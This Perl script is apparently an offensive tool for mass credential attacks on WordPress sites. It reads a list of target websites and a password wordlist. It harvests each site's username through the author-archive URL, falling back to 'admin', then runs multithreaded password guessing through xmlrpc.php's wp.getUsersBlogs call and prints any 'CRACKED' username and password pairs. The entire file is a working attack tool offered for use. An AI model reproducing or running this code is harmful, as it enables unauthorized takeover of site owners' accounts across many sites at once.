#!/usr/bin/perl -w
use strict;
use threads;
use threads::shared;
use LWP::UserAgent;
use Term::ANSIColor;
### modules
if($^O =~ /Win/){
   system("cls");
}else{
   system("clear");
}
my $ua = LWP::UserAgent->new;
$ua->timeout(15);
$ua->agent('Mozilla/5.0');
my $check = '<name>isAdmin</name>';
my @linkz : shared;
my @Passwords : shared;
#### what we need :)
flag();
print color("bold blue"),"\n[+] Enter List Website  : ";
print color 'reset';
my $list=<STDIN>;
chomp($list);
print color("bold blue"),"[+] Enter Passwords list : ";
print color 'reset';
my $file=<STDIN>;
chomp($file);
print color("bold blue"),"[+] Enter Thread Number : ";
print color 'reset';
my $thread=<STDIN>;
chomp($thread);
my $threads = $thread;
exploiter();
sub exploiter {
    GetWebs();
    print color("bold yellow"),"[+] Quantity of website:";print color 'reset';print color("green")," " .scalar(@linkz)."\n";
    GetPasswords();
    print color("bold yellow"),"[+] Quantity of Passwords:";print color 'reset';print color("green")," " .scalar(@Passwords)."\n";
    my $i=0;
    foreach my $link( @linkz ){$i++;
    print color ("bold cyan"),"\n[$i] $link";print color 'reset';    
    print color ("bold green"),"\n    + Looking For Xmlrpc File";print color 'reset';
    check_xmlrpc ($link);
    print color ("bold green"),"\n    + Enumerating UserName ";print color 'reset';
    get_user ($link);
    print "\n";
    }
}
sub Wordpress {
     my $ref = shift;
        my ($Password,$dom,$usr) = @{$ref};
 
    my $target = "http://".$dom."/xmlrpc.php";
        my $req = $ua->post($target , Content_Type => 'application/x-www-form-urlencoded', Content => "
<methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value><string>$usr</string></value></param>
        <param><value><string>$Password</string></value></param>
</params></methodCall>
");
                my $status = $req->content;
                if($status =~ /$check/){
                        print "\n\t    +[CRACKED]-> ($usr : $Password)\n\n";
        }
                else {
                    print"        -> ($usr : $Password) faild\n";
                }
        threads->detach();
        }
 
sub GetPasswords {
        open( LNK, "$file" ) or die "$!\n";
        while( defined( my $line_ = <LNK> ) ) {
                chomp( $line_ );
                push( @Passwords, $line_ );
        }
        close( LNK );
}
sub  get_user {
my $y = toma("http://".$_[0]."/?author=1");
    if ($y=~/<title>(.*?) | (.*?)<\/title>/){
        if(!defined($1))
            {
            my $user = "admin";
            chomp($user);
            print "\n        + Using default user [admin]\n";
            print color ("bold green"),"\n    +[OK] Bruting via xmlrpc\n\n";print color 'reset';
            foreach my $Password( @Passwords ) {
                my  $ctr = 0;
                foreach my $thr ( threads->list ) { $ctr++; }
                if ($ctr < $threads){
                        threads->create( \&Wordpress, [$Password,$_[0],$user]);
                }
                else { redo; }
                while (threads->list) {}
        }
           
            }
            else{
                my $user = $1;
                print color ("bold blue"),"\n        + User is : ";print color ("red")," $user\n";print color 'reset';
                chomp($user);
                print color ("bold green"),"\n    +[OK] Bruting via xmlrpc\n\n";print color 'reset';
                foreach my $Password( @Passwords ) {
                my  $ctr = 0;
                foreach my $thr ( threads->list ) { $ctr++; }
                if ($ctr < $threads){
                        threads->create( \&Wordpress, [$Password,$_[0],$user]);
                }
                else { redo; }
                while (threads->list) {}
        }
               
                }        
    }
}
sub check_xmlrpc {
    my $x = toma ("http://".$_[0]."/xmlrpc.php");
    if ($x =~/accepts POST/) {
        print color ("bold blue"),"\n        + xmlrpc file founded : ";print color 'reset';
    }
    else {
        print color ("bold white"),"\n        + xmlrpc file Not founded ";print color 'reset';
       
    }
   
}
sub GetWebs {
        open( DOM, "$list" ) or die "$!\n";
        while( defined( my $line_ = <DOM> ) ) {
                chomp( $line_ );
                push( @linkz, $line_ );
        }
        close( DOM );
}
 
sub toma {
    return $ua->get( $_[0] )->content;
}
sub flag {
    print q{
         __   __          _                   _                _      
         \ \ / /         | |  (version : 2)  | |              | |      
          \ V / _ __ ___ | |_ __ _ __   ___  | |__  _ __ _   _| |_ ___
           > < | '_ ` _ \| | '__| '_ \ / __| | '_ \| '__| | | | __/ _ \
         / . \| | | | | | | |  | |_) | (__  | |_) | |  | |_| | ||  __/
        /_/ \_\_| |_| |_|_|_|  | .__/ \___| |_.__/|_|   \__,_|\__\___|
                 M-A_Labz       | |       (c) sec4ever.com/home
                                |_|
                               
   };
}
